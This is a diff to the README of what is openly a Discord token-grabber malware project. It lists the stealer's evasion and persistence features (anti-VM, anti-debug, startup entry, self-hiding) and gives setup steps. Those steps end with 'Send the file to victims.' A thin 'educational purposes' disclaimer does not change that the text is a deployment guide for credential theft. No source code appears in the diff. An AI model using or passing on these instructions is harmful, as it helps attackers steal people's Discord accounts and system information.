@@ -42,7 +42,6 @@ Hazard was made for educational purposes, therefor all consequences caused by yo
 > Anti-vm/Anti-debug
 > Add to startup
 > Hides itself
-> Supports github.com/Rdmo1/Discord-Webhook-Protector so webhook can't be deleted or spammed
 > Options are configurable
 > Pretty Fast Even if it Was Made With Python
 > Windows Product Key & Build Info
@@ -64,7 +63,7 @@ Hazard was made for educational purposes, therefor all consequences caused by yo
 2. Open up [hazard.py](https://github.com/Rdmo1/Hazard-Token-Grabber-V3/blob/master/hazard.py) with notepad or some other editor
 3. Locate the config at the top of the file and Replace "WEBHOOK_HERE" with your [discord webhook](https://support.discord.com/hc/en-us/articles/228383668-Intro-to-Webhooks)
 4. and save it
-5. A Window will open prompting for a name. Put something in such as "Token_Logger" (You can always rename the file later)
+5. for the file name , Put something in such as "Token_Logger" (You can always rename the file later)
 6. Send the file to victims. 😈
 
 ## <a id="config"></a>⚙ 〢 Config
